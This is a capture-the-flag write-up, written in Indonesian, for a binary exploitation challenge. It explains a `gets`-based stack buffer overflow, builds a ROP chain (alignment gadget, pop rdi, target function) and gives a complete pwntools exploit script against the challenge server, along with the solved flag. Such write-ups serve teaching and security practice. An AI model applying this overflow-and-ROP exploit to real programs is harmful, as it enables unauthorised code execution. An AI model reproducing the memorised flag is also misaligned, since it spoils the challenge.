# SiebersecCTF 2026 - owo what's this? (Pwn)

## Vulnerability Analysis
Program mengalami kerentanan Stack Buffer Overflow klasik pada fungsi `main` akibat penggunaan fungsi `gets(buf)`. Fungsi `gets` tidak memvalidasi panjang input yang diterima, sehingga input yang melebihi ukuran buffer akan langsung menimpa area memori di atasnya, termasuk Saved RBP dan Return Address (RIP).

Hasil pemeriksaan keamanan biner (`checksec`):
- **Canary**: Disabled (Kondisi ideal untuk mengontrol RIP secara langsung).
- **PIE**: Disabled (Alamat fungsi di memori bersifat statis/tetap pada basis `0x400000`).
- **NX**: Enabled (Stack tidak dapat dieksekusi, sehingga harus menggunakan teknik ROP).

Berdasarkan analisis kode assembly di `main`, posisi buffer berada di `rbp-0x10` (16 bytes). Jarak aman untuk menimpa Return Address adalah:
`16 bytes (buffer) + 8 bytes (saved RBP) = 24 bytes padding.`

## Exploitation Strategy
Tujuan eksploitasi adalah memanggil fungsi `owo_whats_thissssssssssssss` (`0x004011a3`) dengan argumen pertama (`RDI`) bernilai `67416741` (`0x404b2a5`).

Langkah penyusunan ROP Chain:
1. Isi padding sebanyak 24 byte untuk menjangkau RIP.
2. Gunakan gadget `ret` (`0x0040119f`) untuk menyelaraskan stack pointer (Stack Alignment 16-byte) agar fungsi `printf` pada remote server tidak mengalami crash akibat instruksi `MOVAPS`.
3. Panggil gadget `pop rdi; ret` (`0x0040119e`) yang berada di dalam fungsi `owo_whats_this`.
4. Masukkan nilai target `67416741` ke dalam stack agar ter-pop ke register `RDI`.
5. Arahkan eksekusi ke fungsi `owo_whats_thissssssssssssss`.

## Exploit Script
```python
from pwn import *

p = remote('chal.sieberr.live', 21001)

pop_rdi_ret = 0x0040119e 
ret_gadget = 0x0040119f   
target_func = 0x004011a3
argument_sus = 67416741

payload = b"A" * 24
payload += p64(ret_gadget)   
payload += p64(pop_rdi_ret)
payload += p64(argument_sus)
payload += p64(target_func)

p.sendlineafter(b">>> ", payload)
p.interactive()

Flag
sctf{b0rn_70_h1i1i_:3_f0Rc3d_t0_r3g4rD1Ng_mY_l457_3M4iL}
